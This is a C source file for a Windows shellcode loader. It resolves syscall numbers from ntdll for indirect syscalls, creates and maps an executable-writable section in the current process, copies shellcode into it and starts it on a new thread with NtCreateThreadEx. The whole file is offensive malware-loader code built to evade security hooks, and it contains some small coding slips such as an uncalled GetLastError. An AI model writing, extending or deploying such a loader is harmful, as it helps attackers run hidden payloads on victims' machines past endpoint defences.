#include "local_map.h"

VOID IDSC
(
	IN HMODULE ntdll,
	IN LPCSTR NtApi,
	OUT DWORD* FuncSSN,
	OUT PUINT_PTR FuncSyscall
)
{

	if (!FuncSSN || !FuncSyscall)
		return;

	UINT_PTR NtFunction = (UINT_PTR)GetProcAddress(ntdll, NtApi);
	if (!NtFunction)
	{
		WARN("Could Not Resolve Nt Function! Reason: %ld", GetLastError());
		return;
	}


	*FuncSyscall = NtFunction + 0x12;
	*FuncSSN = ((unsigned char*)NtFunction + 4)[0];

	INFO("[SSN: 0x%p] | [Syscall: 0x%p] | %s", *FuncSSN, (PVOID)*FuncSyscall, NtApi);

}


BOOL local_map_inject
(
	IN HANDLE hProcess,
	IN HANDLE hThread,
	IN PBYTE sShellcode,
	IN SIZE_T sShellSize,
	OUT PVOID* pAddress
)

{

	// Variables needed for debugging + values

	BOOL State = TRUE;
	HANDLE hFile = NULL, hSection = NULL;
	PVOID MLocalAddress = NULL;
	SIZE_T size = sShellSize;
	PLARGE_INTEGER maxSize = { size };
	HMODULE ntdll = NULL;
	NTSTATUS STATUS = NULL;
	PVOID localaddress = NULL;


	ntdll = GetModuleHandleW(L"ntdll.dll");
	if (ntdll == NULL)
	{
		WARN("Could not retrive NTDLL! Reason: %lu", GetLastError);
		return FALSE;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	// Calling out Functions via IS

	IDSC(ntdll, "NtCreateSection", &fn_NtCreateSectionSSN, &fn_NtCreateSectionSyscall);
	IDSC(ntdll, "NtMapViewOfSection", &fn_NtMapViewOfSectionSSN, &fn_NtMapViewOfSectionSyscall);
	IDSC(ntdll, "NtCreateThreadEx", &fn_NtCreateThreadExSSN, &fn_NtCreateThreadExSyscall);

	/*--------------------------------------------------------[Creating a Section in Our Process]-----------------------------------------------------------*/

	STATUS = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, hFile);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("Error! Could not Create a Section via Indirect Syscalls! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] NtCreateSection Handle", hSection);
	INFO("NtCreateSection Created with a size of %lld--Bytes", sShellSize);

	/*-----------------------------------------------------------------------[Mapping Our Section]--------------------------------------------------------------------------*/

	STATUS = NtMapViewOfSection(hSection, NtCurrentProcess(), &localaddress, NULL, NULL, NULL, &size, 2, 0, PAGE_EXECUTE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("Error! Could not Map the Section! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] NtMapViewOfSection Base Address Created!", localaddress);
	INFO("Current Protection--[RX]  Current Size Allocated--[%zu--Bytes]", sShellSize);

	// Copy Shellcode into localaddress

	memcpy(localaddress, sShellcode, sShellSize); // Needs RWX

	OKAY("Copied %zu Bytes into Local Section Address!", sShellSize);

	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, localaddress, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtCreateThreadEx Failed to Create a New Thread! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Successfully Created a Thread!", hThread);

	*pAddress = localaddress; // populate pAddress with our mapped shellcode

CLEANUP:

	if (hFile)
		CloseHandle(hFile);
	return State;

}